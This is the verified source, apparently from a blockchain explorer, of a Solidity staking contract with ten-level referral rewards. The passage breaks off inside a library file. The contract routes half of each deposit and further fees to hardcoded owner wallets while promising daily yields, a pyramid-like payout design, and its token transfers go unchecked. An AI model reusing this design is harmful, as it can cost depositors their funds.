{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/SacredFarmStaking.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.6;\\n\\nimport \\\"./interfaces/IERC20.sol\\\";\\nimport \\\"./utils/Ownable.sol\\\";\\nimport \\\"./utils/SafeMath.sol\\\";\\nimport \\\"./utils/ReentrancyGuard.sol\\\";\\nimport \\\"./utils/Pausable.sol\\\";\\n\\ncontract SacredFarmStaking is Ownable, Pausable, ReentrancyGuard {\\n    using SafeMath for uint256; \\n    IERC20 public SFToken;\\n\\n    uint256 private constant revPercents = 5000;\\n    uint256 private constant feePercents = 1000;\\n    uint256 private constant baseDivider = 10000;\\n    uint256 private constant minDeposit = 10e18;\\n    uint256 public minAmountWithdraw = 10e18;\\n    \\n    uint256 public multiplier = 5;\\n\\n    uint256 private constant timeStep = 1 days;\\n \\n    uint256 private constant dayCycle_100 = 99;\\n    uint256 private constant dayCycle_200 = 195;\\n    uint256 private constant dayCycle_400 = 390;\\n    uint256 private constant dayCycle_600 = 585;\\n\\n    uint256 public  Percents_100 = 800000000000000000;\\n    uint256 public  Percents_200 = 1000000000000000000;\\n    uint256 public  Percents_400 = 1200000000000000000;\\n    uint256 public  Percents_600 = 1500000000000000000;\\n\\n    uint256 private constant referDepth = 10;\\n    uint256 private constant directPercents = 500;\\n    uint256[10] private ROIlevel = [800, 500, 400, 300, 200, 100, 100, 100, 200, 200];\\n\\n    uint256 private Card_100 = 99;\\n    uint256 private Card_200 = 195;\\n    uint256 private Card_400 = 390;\\n    uint256 private Card_600 = 585;\\n\\n    address[] public depositors;\\n    address[] public devWallets;\\n    address public revWallet;\\n    address public defaultRefer;\\n\\n    uint256 public startTime;\\n    uint256 public lastDistribute;\\n    uint256 public totalUser;\\n    uint256[] public feePercentages;\\n\\n    struct OrderInfo {\\n        uint256 amount;\\n        uint256 cardDays;\\n        uint256 start;\\n        uint256 unStakeTime; \\n        bool isUnStake;\\n    }\\n    mapping(address => OrderInfo[]) public orderInfos;\\n\\n    struct UserInfo {\\n        address referrer;\\n        uint256 start;\\n        uint256 maxDeposit;\\n        uint256 totalDeposit;\\n        uint256 totalDepositAmount;\\n        uint256 teamNum;\\n        uint256 directsNum;\\n        uint256 maxDirectDeposit;\\n        uint256 teamTotalDeposit;\\n        uint256 totalStake_100;\\n        uint256 totalStake_200;\\n        uint256 totalStake_400;\\n        uint256 totalStake_600;\\n    }\\n    \\n    mapping(address => UserInfo) public userInfo;\\n    mapping(address => mapping(uint256 => address[])) public teamUsers;\\n\\n    struct RewardInfo {\\n        uint256 directs;\\n        uint256 claimedDirectsandAffiliate;\\n        uint256 total_Rewards;\\n    }\\n    mapping(address => RewardInfo) public rewardInfo;\\n    mapping(address => uint256) public rewardReceived;\\n    mapping(address => uint256) public getDirectsamount;\\n    mapping(address=>uint256) public getFlushAmount;\\n\\n    mapping(address=>mapping(uint256=>uint256)) public _totalUser; \\n    mapping(address=>mapping(uint256=>uint256)) public _totalUserAmount;\\n    mapping(address=>mapping(address=>mapping(uint256=>bool))) public _userAddressVerification;\\n\\n    mapping(address => uint256) public countUser;\\n    mapping(address => uint256) public countUser1;\\n\\n    mapping(address => mapping(uint256 => address)) public UserAdress;\\n    mapping(address => mapping(uint256 => uint256)) public UserDepoisteamount;\\n    mapping(address=>mapping(address=>bool)) private _userAddressVerforDirects;\\n    \\n    mapping(address => mapping(uint256 => uint256)) public userCount;\\n    mapping(address => mapping(uint256 => mapping(uint256 => address))) public userReferral;\\n    mapping(address => mapping(address => mapping(uint256 => bool))) private userReferralVerification;\\n    \\n    mapping(address => uint256) private withdraw_Reward_100;\\n    mapping(address => uint256) private withdraw_Reward_200;\\n    mapping(address => uint256) private withdraw_Reward_400;\\n    mapping(address => uint256) private withdraw_Reward_600;\\n\\n    event Register(address user, address referral);\\n    event Deposit(address user, uint256 amount, uint256 cardTime);\\n\\n    constructor() {\\n        SFToken = IERC20(0x55d398326f99059fF775485246999027B3197955);\\n        \\n        revWallet = 0xa8086506D99b494Cf4ea6881B837198192833B27;\\n                \\n        devWallets.push(0xA5ed96593E54B45283ccfFbACeD0b15425b7cfff);\\n        feePercentages.push(100);\\n        devWallets.push(0xAc2166440783e9f8EE181fE8a5AcEC469253d08a);\\n        feePercentages.push(100);\\n        devWallets.push(0xcD5bc97Baaa897f5F1E4CEc85622A7697b275d1B);\\n        feePercentages.push(100);\\n        devWallets.push(0xe33CD8a37F3d839DBed8d01A954844E8026aB9ef);\\n        feePercentages.push(100);\\n        devWallets.push(0x61Cd486aD67eed1E3FB280409e354247D1e17F12);\\n        feePercentages.push(100);\\n        devWallets.push(0xF6250d8805225Fe43B704c27a7D97e481F30F207);\\n        feePercentages.push(100);\\n        devWallets.push(0xC38cF93e08Eb5eF6a3C20BFE13fdD8822b532851);\\n        feePercentages.push(400);\\n\\n        defaultRefer = 0xc1C80fe12e77257928F327f001DFAF64520A0eba;\\n        \\n        startTime = block.timestamp;\\n        lastDistribute = block.timestamp;\\n    }\\n\\n    function register(address _referral) public {\\n        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, \\\"invalid refer\\\");\\n        UserInfo storage user = userInfo[msg.sender];\\n        require(user.referrer == address(0), \\\"referrer bonded\\\");\\n        user.referrer = _referral;\\n        user.start = block.timestamp;\\n        userInfo[user.referrer].directsNum = userInfo[user.referrer].directsNum.add(1);\\n        _updateTeamNum(msg.sender);\\n        totalUser = totalUser.add(1);\\n        emit Register(msg.sender, _referral);\\n    }\\n\\n    function deposit(uint256 _tokenAmount, uint256 _cardTime)  \\n    external\\n    nonReentrant\\n    whenNotPaused\\n    {\\n        require(_tokenAmount >= minDeposit, \\\"Less than Minimum\\\");\\n        require(msg.sender == tx.origin, \\\"External Error\\\");\\n        require(_cardTime == dayCycle_100 \\n        || _cardTime == dayCycle_200\\n        || _cardTime == dayCycle_400\\n        || _cardTime == dayCycle_600,\\n        \\\"CardTime error\\\");\\n\\n        SFToken.transferFrom(msg.sender, address(this), _tokenAmount);\\n        uint256 revDeduction = _tokenAmount.mul(revPercents).div(baseDivider);\\n        SFToken.transfer(revWallet, revDeduction);\\n        _distributeFees(_tokenAmount);\\n        _deposit(msg.sender, _tokenAmount, _cardTime);\\n        emit Deposit(msg.sender, _tokenAmount, _cardTime);\\n    }\\n\\n    function _deposit(address _user, uint256 _tokenAmount, uint256 cardTime) private {\\n        UserInfo storage user = userInfo[_user];\\n        require(user.referrer != address(0), \\\"register first\\\");\\n\\n        if (user.maxDeposit == 0) {\\n            user.maxDeposit = _tokenAmount;\\n        } else if (user.maxDeposit < _tokenAmount) {\\n            user.maxDeposit = _tokenAmount;\\n        }\\n\\n        depositors.push(_user);\\n        if (cardTime == dayCycle_100) {\\n            user.totalStake_100 = user.totalStake_100.add(_tokenAmount);\\n        } else if (cardTime == dayCycle_200) {\\n            user.totalStake_200 = user.totalStake_200.add(_tokenAmount);\\n        } else if (cardTime == dayCycle_400) {\\n            user.totalStake_400 = user.totalStake_400.add(_tokenAmount);\\n        } else if (cardTime == dayCycle_600) {\\n            user.totalStake_600 = user.totalStake_600.add(_tokenAmount);\\n        }\\n        \\n        user.totalDeposit = totalDeposite(_user);\\n        user.totalDepositAmount += _tokenAmount;\\n\\n        uint256 unfreezeTime = block.timestamp.add(cardTime);\\n        orderInfos[_user].push(OrderInfo(\\n            _tokenAmount,\\n            cardTime,\\n            block.timestamp, \\n            unfreezeTime,\\n            false\\n        ));\\n\\n        _updateReferInfo(_user, _tokenAmount);\\n        _updateDirects(_user, _tokenAmount);\\n        _updateUserLevelInfo(_user, _tokenAmount);\\n        UpdateDirectsInfo(_user);\\n        updateReferral(_user);\\n    }\\n\\n    function updateReferral(address _user) public {\\n        UserInfo storage user = userInfo[_user];\\n        address upline = user.referrer;\\n        for(uint256 i = 1; i <= referDepth; i++){\\n            if (upline != address(0)) {\\n                if (!userReferralVerification[upline][_user][i]) { \\n                    userCount[upline][i] += 1;\\n                    uint256 counts = userCount[upline][i];\\n                    userReferral[upline][i][counts] = _user;\\n                    userReferralVerification[upline][_user][i] = true;\\n                }\\n                if (upline == defaultRefer) {\\n                    break;\\n                }\\n                upline = userInfo[upline].referrer;\\n            } else {\\n                break;\\n            }\\n        }\\n    }\\n\\n    function UpdateROI(address users) view public returns(uint256) {\\n        uint256[10] memory rewardsTotal;\\n        uint256 sum = 0;\\n        for (uint256 _levels = 1; _levels <= referDepth ; _levels++) {\\n            rewardsTotal[_levels-1] = UpdateROIInfo1(users,_levels);\\n        }\\n\\n        for (uint256 j = 0; j < referDepth; j++) {  \\n            sum = sum.add(rewardsTotal[j]);  \\n        }\\n\\n        sum = sum.sub(rewardReceived[users]);\\n        return sum;\\n    }\\n    \\n    function UpdateROIInfo1(address users, uint256 levels) public view returns (uint256) {\\n        uint256 countsUser = userCount[users][levels];\\n        uint256 totalRewards;\\n        for(uint256 userlevels = 1; userlevels <= countsUser ; userlevels++) {\\n            totalRewards += UpdateROIInfo(users,levels,userlevels);\\n        }\\n        return totalRewards;\\n    }\\n\\n    function UpdateROIInfo(address users, uint256 levels, uint256 userlevels) public view returns (uint256) {\\n        uint256 _amounts;\\n        uint256 totalday;\\n        uint256 reward;\\n        address userAddress = userReferral[users][levels][userlevels];\\n        for (uint256 i = 0; i < orderInfos[userAddress].length; i++) {\\n            OrderInfo storage order = orderInfos[userAddress][i];\\n            if (order.cardDays == dayCycle_100) {\\n                _amounts = (order.amount.mul(Percents_100)).div(baseDivider);\\n                _amounts = _amounts.div(1e16);\\n                totalday = getTotalDay(order.start);\\n                if (totalday > Card_100) {    \\n                    totalday = Card_100;   \\n                }\\n                _amounts = totalday.mul(_amounts);\\n                _amounts = (_amounts.mul(ROIlevel[levels-1])).div(baseDivider);\\n                reward += _amounts;\\n            } else if (order.cardDays == dayCycle_200) {\\n                _amounts = (order.amount.mul(Percents_200)).div(baseDivider);\\n                _amounts = _amounts.div(1e16);\\n                totalday = getTotalDay(order.start);\\n                if (totalday > Card_200) {\\n                    totalday = Card_200;   \\n                }\\n                _amounts = totalday.mul(_amounts);\\n                _amounts = (_amounts.mul(ROIlevel[levels-1])).div(baseDivider);\\n                reward += _amounts;\\n\\n            } else if (order.cardDays == dayCycle_400) {\\n                _amounts = (order.amount.mul(Percents_400)).div(baseDivider);\\n                _amounts = _amounts.div(1e16);\\n                totalday = getTotalDay(order.start);\\n                if (totalday > Card_400) {    \\n                    totalday = Card_400;   \\n                }\\n                _amounts = totalday.mul(_amounts);\\n                _amounts = (_amounts.mul(ROIlevel[levels-1])).div(baseDivider);\\n                reward += _amounts;\\n            } else if (order.cardDays == dayCycle_600) {\\n                _amounts = (order.amount.mul(Percents_600)).div(baseDivider);\\n                _amounts = _amounts.div(1e16);\\n                totalday = getTotalDay(order.start);\\n                if (totalday > Card_600) {    \\n                    totalday = Card_600;   \\n                }\\n                _amounts = totalday.mul(_amounts);\\n                _amounts = (_amounts.mul(ROIlevel[levels-1])).div(baseDivider);\\n                reward += _amounts;\\n            }\\n        }\\n        return reward;\\n    }\\n\\n    function totalDeposite(address user1) public view returns(uint256) {\\n        UserInfo storage user = userInfo[user1];\\n        uint256 TotalDeposites= user.totalStake_100.add(user.totalStake_200).add(user.totalStake_400).add(user.totalStake_600);\\n        return  TotalDeposites;\\n    }\\n\\n    function _updateUserLevelInfo(address _user, uint256 _amount) private {\\n        UserInfo storage user = userInfo[_user];\\n        address upline = user.referrer;\\n        for (uint256 i = 0; i < referDepth; i++) {\\n            if (upline != address(0)) {\\n                if (!_userAddressVerification[_user][upline][i]) {\\n                    _totalUser[upline][i] += 1;\\n                    _userAddressVerification[_user][upline][i] = true;\\n                }\\n                _totalUserAmount[upline][i] += _amount;\\n                if (upline == defaultRefer) {\\n                    break;\\n                }\\n                upline = userInfo[upline].referrer;\\n            } else {\\n                break;\\n            }\\n        }\\n    }\\n\\n    function getRewards(address _user) \\n        public \\n        view returns(uint256 _reward_100,uint256 _reward_200,uint256 _reward_400,uint256 _reward_600) {\\n        (uint256 _reward_1000,uint256 _reward_2000, uint256 _reward_4000,uint256 _reward_6000) =  UpdateRewards(_user);\\n        _reward_1000 = _reward_1000.sub(withdraw_Reward_100[_user]);\\n        _reward_2000 = _reward_2000.sub(withdraw_Reward_200[_user]);\\n        _reward_4000 = _reward_4000.sub(withdraw_Reward_400[_user]);\\n        _reward_6000 = _reward_6000.sub(withdraw_Reward_600[_user]);\\n        return (_reward_1000, _reward_2000,  _reward_4000,_reward_6000);\\n    }\\n   \\n    function withdraw(uint256 withdrwa_cardTime) external whenNotPaused {\\n        uint256 totalReward;\\n\\n        require(withdrwa_cardTime == dayCycle_100 \\n        || withdrwa_cardTime == dayCycle_200 \\n        || withdrwa_cardTime == dayCycle_400\\n        || withdrwa_cardTime == dayCycle_600,\\\"Invalid Card Time\\\");\\n        \\n        (uint256 rewards_100,uint256 rewards_200, uint256 rewards_400,uint256 rewards_600)= getRewards(msg.sender);\\n        if (withdrwa_cardTime == dayCycle_100) {\\n            withdraw_Reward_100[msg.sender] = withdraw_Reward_100[msg.sender] + rewards_100;\\n            totalReward = rewards_100;\\n        } else if (withdrwa_cardTime == dayCycle_200) {\\n            withdraw_Reward_200[msg.sender] = withdraw_Reward_200[msg.sender] + rewards_200;\\n            totalReward = rewards_200;\\n        } else if (withdrwa_cardTime == dayCycle_400) {\\n            withdraw_Reward_400[msg.sender] = withdraw_Reward_400[msg.sender] + rewards_400;\\n            totalReward = rewards_400;\\n        } else if (withdrwa_cardTime == dayCycle_600) {\\n            withdraw_Reward_600[msg.sender] = withdraw_Reward_600[msg.sender] + rewards_600;\\n            totalReward = rewards_600;\\n        }\\n        \\n        require(totalReward >= minAmountWithdraw, \\\"Error1\\\");\\n\\n        RewardInfo storage upRewards = rewardInfo[msg.sender];\\n        uint256 calwithdrwable = totalReward;\\n        upRewards.total_Rewards += calwithdrwable;\\n\\n        uint256 feeDeduction = calwithdrwable.mul(feePercents).div(baseDivider);\\n        calwithdrwable = calwithdrwable.sub(feeDeduction);\\n        require(calwithdrwable > 0, \\\"Error2\\\");\\n        \\n        _distributeFees(totalReward);\\n        SFToken.transfer(msg.sender,  calwithdrwable);\\n    }\\n    \\n    function getDirectsAndROI(address _user) public view returns (uint256, uint256, uint256) {   \\n        uint256 remainingValue;\\n        uint256 totalValue;\\n        uint256 totalValueflash;\\n\\n        UserInfo storage user = userInfo[_user];\\n        totalValue = user.totalDepositAmount * multiplier;\\n\\n        uint256 TotalROI = UpdateROI(_user);\\n\\n        RewardInfo storage upRewards = rewardInfo[_user];\\n\\n        remainingValue = upRewards.directs.add(TotalROI).add(upRewards.claimedDirectsandAffiliate);\\n\\n        if (remainingValue >= totalValue ) {\\n            totalValueflash = remainingValue.sub(totalValue);\\n            remainingValue = totalValue;\\n        }\\n        remainingValue = remainingValue.sub(upRewards.claimedDirectsandAffiliate);\\n        \\n        return (TotalROI, remainingValue, totalValueflash);\\n    }\\n\\n    function withdrawDirectsandROI() external whenNotPaused {   \\n        (uint256 _TotalROI, uint256 _remainingValue, uint256 _totalValueflash) = getDirectsAndROI(msg.sender);\\n        require(_remainingValue > 0, \\\"Error1\\\");\\n        \\n        getFlushAmount[msg.sender] += _totalValueflash;\\n        rewardReceived[msg.sender] += _TotalROI;\\n        RewardInfo storage upRewards = rewardInfo[msg.sender];\\n        \\n        uint256 calwithdrwable1 = _remainingValue;\\n        upRewards.claimedDirectsandAffiliate += calwithdrwable1;\\n\\n        uint256 feeDeduction = calwithdrwable1.mul(feePercents).div(baseDivider);\\n        calwithdrwable1 = calwithdrwable1.sub(feeDeduction);\\n\\n        require(calwithdrwable1 > 0, \\\"Error2\\\");\\n\\n        _distributeFees(_remainingValue);\\n        SFToken.transfer(msg.sender,  calwithdrwable1);\\n\\n        upRewards.directs = 0;\\n    }\\n\\n    function getMaxFreezing(address _user) public view returns(uint256) {\\n        uint256 maxFreezing;\\n        for(uint256 i = orderInfos[_user].length; i > 0; i--){\\n            OrderInfo storage order = orderInfos[_user][i - 1];\\n            if (order.unStakeTime > block.timestamp){\\n                if (order.amount > maxFreezing){\\n                    maxFreezing = order.amount;\\n                }\\n            }else{\\n                break;\\n            }\\n        }\\n        return maxFreezing;\\n    }\\n\\n    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){\\n        uint256 totalTeam;\\n        uint256 maxTeam;\\n        uint256 otherTeam;\\n        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){\\n            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);\\n            totalTeam = totalTeam.add(userTotalTeam);\\n            if (userTotalTeam > maxTeam) {\\n                maxTeam = userTotalTeam;\\n            }\\n        }\\n        otherTeam = totalTeam.sub(maxTeam);\\n        return(maxTeam, otherTeam, totalTeam);\\n    }\\n\\n    function _updateTeamNum(address _user) private {\\n        UserInfo storage user = userInfo[_user];\\n        address upline = user.referrer;\\n        for (uint256 i = 0; i < referDepth; i++) {\\n            if (upline != address(0)) {\\n                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);\\n                teamUsers[upline][i].push(_user);\\n                if (upline == defaultRefer) {\\n                    break;\\n                }\\n                upline = userInfo[upline].referrer;\\n            } else {\\n                break;\\n            }\\n        }\\n    }\\n\\n    function _updateReferInfo(address _user, uint256 _amount) private {\\n        UserInfo storage user = userInfo[_user];\\n        address upline = user.referrer;\\n        for (uint256 i = 0; i < referDepth; i++) {\\n            if (upline != address(0)) {\\n                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);\\n                if (upline == defaultRefer) {\\n                    break;\\n                }\\n                upline = userInfo[upline].referrer;\\n            } else {\\n                break;\\n            }\\n        }\\n    }\\n\\n    function UpdateRewards(address users) private \\n    view returns (uint256 _reward_100,uint256 _reward_200, uint256 _reward_400,uint256 _reward_600 ) {\\n        uint256 _amounts;\\n        uint256 totalday;\\n        uint256 reward;\\n        uint256 reward_100;\\n        uint256 reward_200;\\n        uint256 reward_400;\\n        uint256 reward_600;\\n\\n        for (uint256 i = 0; i < orderInfos[users].length; i++){\\n            OrderInfo storage order = orderInfos[users][i];\\n            if (order.cardDays == dayCycle_100) {\\n                _amounts = (order.amount.mul(Percents_100)).div(baseDivider);\\n                _amounts = _amounts.div(1e16);\\n                totalday = getTotalDay(order.start);\\n                if (totalday > Card_100) {\\n                    totalday = Card_100;   \\n                }\\n                reward = totalday.mul(_amounts);\\n                reward_100 += reward;  \\n            } else if (order.cardDays == dayCycle_200) {\\n                _amounts = (order.amount.mul(Percents_200)).div(baseDivider);\\n                _amounts = _amounts.div(1e16);\\n                totalday = getTotalDay(order.start);\\n                if (totalday > Card_200) {\\n                    totalday = Card_200;   \\n                }\\n                reward = totalday.mul(_amounts);\\n                reward_200 += reward; \\n            }\\n            else if (order.cardDays == dayCycle_400) {\\n                _amounts = (order.amount.mul(Percents_400)).div(baseDivider);\\n                _amounts = _amounts.div(1e16);\\n                totalday = getTotalDay(order.start);\\n                if (totalday > Card_400) {\\n                    totalday = Card_400;   \\n                }\\n                reward = totalday.mul(_amounts);\\n                reward_400 += reward; \\n            } else if (order.cardDays == dayCycle_600) {\\n                _amounts = (order.amount.mul(Percents_600)).div(baseDivider);\\n                _amounts = _amounts.div(1e16);\\n                totalday = getTotalDay(order.start);\\n                if (totalday > Card_600) {\\n                    totalday = Card_600;   \\n                }\\n                reward = totalday.mul(_amounts);\\n                reward_600 += reward; \\n            }\\n        }\\n        return (reward_100,reward_200,reward_400,reward_600);\\n    }\\n\\n    function _distributeFees(uint256 _amount) internal {\\n        for (uint256 i = 0; i < devWallets.length; i++) {\\n            uint256 feeShare = _amount.mul(feePercentages[i]).div(baseDivider);\\n            SFToken.transfer(devWallets[i], feeShare);\\n        }\\n    }\\n\\n    function _updateDirects(address _user, uint256 _amount) private {\\n        UserInfo storage user = userInfo[_user];\\n        address upline = user.referrer;\\n            if (upline != address(0)) {\\n                uint256 newAmount = _amount;\\n                RewardInfo storage upRewards = rewardInfo[upline];\\n                uint256 reward;\\n                reward = newAmount.mul(directPercents).div(baseDivider);\\n                upRewards.directs = upRewards.directs.add(reward);\\n                getDirectsamount[_user] += reward;\\n            } \\n    }\\n  \\n    function UpdateDirectsInfo(address _user) private{\\n        UserInfo storage user = userInfo[_user];\\n        address upline = user.referrer;\\n            if (upline != address(0)) {\\n                if (!_userAddressVerforDirects[_user][upline]) {\\n                    countUser1[upline] += 1; \\n                    countUser[_user] = countUser1[upline];\\n                    _userAddressVerforDirects[_user][upline] = true;\\n                }\\n                UserAdress[upline][countUser[_user]] = _user;\\n                UserDepoisteamount[upline][countUser[_user]] = totalDeposite(_user);\\n            }\\n    }\\n    function unstakeAmount(uint256 Unstake_cardTime, address User_) public view returns (bool, uint256)\\n    {\\n        bool unstakeCheck;\\n        uint256 amount;\\n        for (uint256 i = 0; i < orderInfos[User_].length; i++){\\n            OrderInfo storage order = orderInfos[User_][i];\\n            if (dayCycle_100 == Unstake_cardTime) {\\n                if (order.cardDays == dayCycle_100) {\\n                    if (!order.isUnStake) {\\n                        uint256 totalday = getTotalDay(order.start);\\n                        if (totalday > Card_100) {\\n                            unstakeCheck = true;\\n                            amount += order.amount;\\n                        }\\n                    }\\n                }\\n            }\\n            if (dayCycle_200 == Unstake_cardTime) {\\n                if (order.cardDays == dayCycle_200) {\\n                    if (!order.isUnStake) {\\n                        uint256 totalday = getTotalDay(order.start);\\n                        if (totalday > Card_200) {\\n                            unstakeCheck = true;\\n                            amount += order.amount;\\n                        }\\n                    }\\n                }\\n            }\\n            if (dayCycle_400 == Unstake_cardTime) {\\n                if (order.cardDays == dayCycle_400) {\\n                    if (!order.isUnStake) {\\n                        uint256 totalday = getTotalDay(order.start);\\n                        if (totalday > Card_400) {\\n                            unstakeCheck = true;\\n                            amount += order.amount;\\n                        }\\n                    }\\n                }\\n            }\\n            if (dayCycle_600 == Unstake_cardTime) { \\n                if (order.cardDays == dayCycle_600) {\\n                    if (!order.isUnStake) {\\n                        uint256 totalday = getTotalDay(order.start);\\n                        if (totalday > Card_600) {\\n                            unstakeCheck = true;\\n                            amount += order.amount;\\n                        }\\n                    }\\n                }\\n            }\\n        }\\n        return (unstakeCheck, amount);\\n    }\\n\\n    function unstake(uint256 Unstake_cardTime) public {\\n        UserInfo storage user = userInfo[msg.sender];\\n        for(uint256 i = 0; i < orderInfos[msg.sender].length; i++){\\n            OrderInfo storage order = orderInfos[msg.sender][i];\\n            if (dayCycle_100 == Unstake_cardTime) {\\n                if (order.cardDays == dayCycle_100) {\\n                    if (!order.isUnStake) {\\n                        uint256 totalday = getTotalDay(order.start);\\n                        if (totalday > Card_100) {\\n                            user.totalStake_100 = user.totalStake_100.sub(order.amount);\\n                            SFToken.transfer(msg.sender, order.amount);\\n                            UpdateDirectsInfo(msg.sender);\\n                            order.isUnStake = true;\\n                        }\\n                    }\\n                }\\n            }\\n            if (dayCycle_200 == Unstake_cardTime) {\\n                if (order.cardDays == dayCycle_200) {\\n                    if (!order.isUnStake) {\\n                        uint256 totalday = getTotalDay(order.start);\\n                        if (totalday > Card_200) {\\n                            user.totalStake_200 = user.totalStake_200.sub(order.amount);\\n                            SFToken.transfer(msg.sender, order.amount);\\n                            UpdateDirectsInfo(msg.sender);\\n                            order.isUnStake = true;\\n                        }\\n                    }\\n                }\\n            }\\n            if (dayCycle_400 == Unstake_cardTime) {\\n                if (order.cardDays == dayCycle_400) {\\n                    if (!order.isUnStake) {\\n                        uint256 totalday = getTotalDay(order.start);\\n                        if (totalday > Card_400) {\\n                            user.totalStake_400 = user.totalStake_400.sub(order.amount);\\n                            SFToken.transfer(msg.sender, order.amount);\\n                            UpdateDirectsInfo(msg.sender);\\n                            order.isUnStake = true;                            \\n                        }\\n                    }\\n                }\\n            }\\n            if (dayCycle_600 == Unstake_cardTime) {\\n                if (order.cardDays == dayCycle_600) {\\n                    if (!order.isUnStake) {\\n                        uint256 totalday = getTotalDay(order.start);\\n                        if (totalday > Card_600) {\\n                            user.totalStake_600 = user.totalStake_600.sub(order.amount);\\n                            SFToken.transfer(msg.sender, order.amount);\\n                            UpdateDirectsInfo(msg.sender);\\n                            order.isUnStake = true;\\n                        }\\n                    }\\n                }\\n            }\\n        }\\n    }\\n\\n    function getTotalDay(uint256 _day) public view returns(uint256) {\\n        return (block.timestamp.sub(_day)).div(timeStep);\\n    }\\n\\n    function getCurDay() public view returns(uint256) {\\n        return (block.timestamp.sub(startTime)).div(timeStep);\\n    }\\n\\n    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {\\n        return teamUsers[_user][_layer].length;\\n    }\\n\\n    function getOrderLength(address _user) external view returns(uint256) {\\n        return orderInfos[_user].length;\\n    }\\n\\n    function getDepositorsLength() external view returns(uint256) {\\n        return depositors.length;\\n    }\\n\\n    function UpdateMultiplier(uint256 _multiplier) public onlyOwner {   \\n        multiplier = _multiplier;   \\n    }\\n\\n    function UpdateDefaultRefer(address _defaultRefer) public onlyOwner {   \\n        defaultRefer = _defaultRefer;\\n    }\\n\\n    function pauseContract() public onlyOwner {\\n        _pause();\\n    }\\n\\n    function unPauseContract() public onlyOwner {\\n        _unpause();\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/interfaces/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: GPLv3\\n\\npragma solidity ^0.8.6;\\n\\ninterface IERC20 {\\n    function transfer(address to, uint256 value) external returns (bool);\\n    function approve(address spender, uint256 value) external returns (bool);\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address who) external view returns (uint256);\\n    function allowance(address owner, address spender) external view returns (uint256);\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\\n\"\r\n    },\r\n    \"contracts/utils/Ownable.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity ^0.8.6;\\r\\n\\r\\nimport \\\"./Context.sol\\\";\\r\\n\\r\\ncontract Ownable is Context {\\r\\n    address private _owner;\\r\\n\\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    /**\\r\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\r\\n     */\\r\\n    constructor () {\\r\\n        address msgSender = _msgSender();\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the address of the current owner.\\r\\n     */\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Throws if called by any account other than the owner.\\r\\n     */\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Leaves the contract without owner. It will not be possible to call\\r\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\r\\n     *\\r\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\r\\n     * thereby removing any functionality that is only available to the owner.\\r\\n     */\\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\r\\n     * Can only be called by the current owner.\\r\\n     */\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        emit OwnershipTransferred(_owner, newOwner);\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\\r\\n\"\r\n    },\r\n    \"contracts/utils/SafeMath.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: GPLv3\\n\\npragma solidity ^0.8.6;\\n\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        require(c / a == b);\\n        return c;\\n    }\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b > 0);\\n        uint256 c = a / b;\\n        return c;\\n    }\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b <= a);\\n        uint256 c = a - b;\\n        return c;\\n    }\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c >= a);\\n        return c;\\n    }\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b != 0);\\n        return a % b;\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/utils/ReentrancyGuard.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)\\n\\npragma solidity ^0.8.0;\\n\\nabstract contract ReentrancyGuard {\\n    uint256 private constant _NOT_ENTERED = 1;\\n    uint256 private constant _ENTERED = 2;\\n    uint256 private _status;\\n\\n    constructor() {\\n        _status = _NOT_ENTERED;\\n    }\\n\\n    modifier nonReentrant() {\\n        _nonReentrantBefore();\\n        _;\\n        _nonReentrantAfter();\\n    }\\n\\n    function _nonReentrantBefore() private {\\n        require(_status != _ENTERED, \\\"ReentrancyGuard: reentrant call\\\");\\n        _status = _ENTERED;\\n    }\\n\\n    function _nonReentrantAfter() private {\\n        _status = _NOT_ENTERED;\\n    }\\n\\n    function _reentrancyGuardEntered() internal view returns (bool) {\\n        return _status == 